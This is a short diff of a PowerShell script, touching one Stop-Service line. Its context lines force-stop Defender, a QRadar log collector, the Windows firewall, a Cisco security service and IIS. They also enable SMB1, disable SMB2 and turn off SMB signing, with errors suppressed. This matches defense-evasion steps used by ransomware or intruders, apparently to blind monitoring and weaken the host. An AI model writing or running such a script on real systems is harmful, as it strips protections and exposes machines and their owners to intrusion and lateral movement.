@@ -3,7 +3,7 @@ Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Process -Name "MsMpEng" -Force -ErrorAction Ignore
 Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
 Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
-Stop-Service -Name "W3SVC" -Force -ErrorAction Ignore
+Stop-Service "W3SVC" -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
